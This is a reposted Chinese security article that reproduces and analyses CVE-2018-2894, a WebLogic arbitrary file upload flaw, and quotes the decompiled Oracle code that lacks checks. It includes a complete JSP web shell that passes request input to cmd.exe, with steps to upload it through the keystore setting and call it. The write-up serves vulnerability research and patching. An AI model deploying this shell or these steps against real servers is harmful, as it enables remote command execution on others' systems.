# 转载 | WebLogic任意文件上传漏洞复现与分析 - CVE-2018-2894

阅读量 **244983**

发布时间 : 2018-07-19 18:35:24

 **x**

##### 译文声明

本文是翻译文章，文章来源：xz.aliyun.com

原文地址：<https://xz.aliyun.com/t/2458>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t018d8f9d0e1dc9d724.jpg)

## CVE-2018-2894

漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3

下载地址：<http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip>

## 漏洞复现

服务启动后，访问 <http://localhost:7001/ws_utc/config.do>

[](https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1cfa6d78-8b3d-1.png)

可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到`C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war`下

选择右边的`安全`栏目，添加`JKS Keystores`上传文件。假设`chybeta.jsp`内容如下：

    
    
    <%@ page import="java.util.*,java.io.*,java.net.*"%>
    <HTML><BODY>
    <FORM METHOD="POST" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "\n<BR>");
            Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                    out.println(disr); disr = dis.readLine(); }
            }
    %>
    </pre>
    </BODY></HTML>
    

抓包获取到时间戳为`1531987145013`，则上传到的位置即`config\keystore\1531987145013_chybeta.jsp`

[](https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d2762a6-8b3d-1.png)

访问`<http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp>`

[](https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d3c553a-8b3d-1.png)

## 简要漏洞分析

在`ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59`:

    
    
    public void changeWorkDir(String path) {
        String[] oldPaths = this.getRelatedPaths();
        if (this.testPageProvider.getWsImplType() == ImplType.JRF) {
            this.isWorkDirChangeable = false;
            this.isWorkDirWritable = isDirWritable(path);
            this.isWorkDirChangeable = true;
            this.setTestClientWorkDir(path);
        } else {
            this.persistWorkDir(path);
            this.init();
        }
    
        if (this.isWorkDirWritable) {
            String[] newPaths = this.getRelatedPaths();
            moveDirs(oldPaths, newPaths);
        } else {
            Logger.fine("[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.");
        }
    
    }
    

此函数用于改变工作目录，但其中并未做任何检测。

在`ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181`中：

    
    
    @Path("/keystore")
        @POST
        @Produces({"application/xml", "application/json"})
        @Consumes({"multipart/form-data"})
        public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) {
            if (!RequestUtil.isRequstedByAdmin(this.request)) {
                return Response.status(Status.FORBIDDEN).build();
            } else {
                if (TestClientRT.isVerbose()) {
                    Logger.fine("calling SettingResource.addKeyStoreSettingByMultiPart");
                }
    
                String currentTimeValue = "" + (new Date()).getTime();
                KeyValuesMap<String, String> formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue);
                ....
            }
        }
    

跟入`ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31`

    
    
    public static String getKeyStorePath() {
            return getConfigDir() + File.separator + "keystore";
        }
    

得到要写入的路径`storePath`。

在`ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145`:

    
    
    public KeyValuesMap<String, String> convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) {
        ...
        if (attachName != null && attachName.trim().length() > 0) {
            if (attachName != null && attachName.trim().length() != 0) {
                attachName = this.refactorAttachName(attachName);
                if (fileNamePrefix == null) {
                    fileNamePrefix = key;
                }
    
                String filename = (new File(storePath, fileNamePrefix + "_" + attachName)).getAbsolutePath();
                kvMap.addValue(key, filename);
                if (isExtactAttachment) {
                    this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));
                }
            }
        } 
        ...
    }
    

把上传文件的内容传到了`storePath`目录里，文件名满足`fileNamePrefix + "_" +
attachName`。这过程没有任何过滤和检查：）…

条件：

  * 需要知道部署应用的web目录
  * `ws_utc/config.do`在开发模式下无需认证，在生产模式下需要认证。具体可见[Oracle® Fusion Middleware Administering Web Services](https://docs.oracle.com/middleware/1212/owsm/WSSEC/webservice-test.htm#WSSEC3642)

## Reference

  * <http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html>
  * <https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ>

本文翻译自xz.aliyun.com [原文链接](https://xz.aliyun.com/t/2458)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152368](/post/id/152368)

安全客 - 有思想的安全新媒体

本文转载自: [xz.aliyun.com](https://xz.aliyun.com/t/2458)

如若转载,请注明出处： <https://xz.aliyun.com/t/2458>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [CVE-2018-2894](/tag/CVE-2018-2894)
  * [漏洞复现](/tag/漏洞复现)

 **+1** __17赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

